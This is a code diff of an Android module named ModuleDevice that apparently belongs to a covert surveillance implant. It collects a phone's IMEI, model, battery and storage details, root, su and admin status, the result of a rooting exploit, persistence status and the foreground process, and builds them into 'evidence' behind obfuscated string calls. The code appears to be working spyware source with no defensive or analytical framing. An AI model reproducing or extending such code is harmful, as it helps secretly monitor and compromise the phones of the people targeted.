@@ -18,11 +18,12 @@ import android.os.Environment;
 import android.os.StatFs;
 
 import com.android.dvci.Device;
+import com.android.dvci.Root;
 import com.android.dvci.RunningProcesses;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.ConfModule;
+import com.android.dvci.crypto.Keys;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.listener.AR;
@@ -135,12 +136,14 @@ public class ModuleDevice extends BaseInstantModule {
 			boolean root = checkRoot();
 			boolean su = Status.self().haveSu();
 
+			if(Cfg.DEMO) {
+				sb.insert(0, M.e("BinaryPatched:") + Keys.self().binarypatch[8] + "\n");
+			}
 			sb.insert(0, M.e("Model:") + Build.DISPLAY + "\n");
 			sb.insert(0, M.e("IMEI: ") + Device.self().getImei() + "\n");
-			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") + ", status=" + Status.getExploitStatusString() + ", result=" + Status.getExploitResultString()
-					+ M.e(", Su: ") + (su ? "yes" : "no") + " "
-					+ M.e(", Admin: ") + (admin ? "yes" : "no") + "\n");
-			sb.insert(0, M.e("Free space: ") + freeSpace + " KB" + "\n");
+			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") 	+ M.e(", Su: ") + (su ? "yes" : "no")
+					+ M.e(", Admin: ") + (admin ? "yes" : "no") +  M.e(", Persistence: ") + Status.getPersistencyStatusStr() + "\n");
+			sb.insert(0, M.e("Free space: ") + freeSpace + " KB " + M.e("Installation: ") + "\n");
 			sb.insert(0, M.e("Battery: ") + battery + "%" + "\n");
 
 
@@ -186,6 +189,10 @@ public class ModuleDevice extends BaseInstantModule {
 	private long getSystem(final StringBuffer sb) {
 		// SYSTEM
 		sb.append("\n" + M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$
+
+		sb.append(M.e("Root Status: ") + Status.getExploitStatusString() + M.e(", Result: ") + Status.getExploitResultString() + "\n");
+		sb.append(M.e("OS Runtime: ") + (Root.isArtInUse()?M.e("ART"):M.e("Dalvik"))+ "\n");
+		sb.append(M.e("Runtime: ") + Build.BOARD + "\n");
 		sb.append(M.e("Board: ") + Build.BOARD + "\n");
 		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
 		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
@@ -214,8 +221,8 @@ public class ModuleDevice extends BaseInstantModule {
 		sb.append(M.e("External state: ") + Environment.getExternalStorageState() + "\n");
 		sb.append(M.e("External space: ") + bytesAvailableExt + "\n");
 
-		RunningProcesses runningProcesses = new RunningProcesses();
-		sb.append(M.e("Foreground process: ") + runningProcesses.getForeground() + "\n"); //$NON-NLS-1$
+		RunningProcesses runningProcesses = RunningProcesses.self();
+		sb.append(M.e("Foreground process: ") + runningProcesses.getForeground_wrapper() + "\n"); //$NON-NLS-1$
 
 		ModuleMic mic = ModuleMic.self();
 		if (mic != null) {
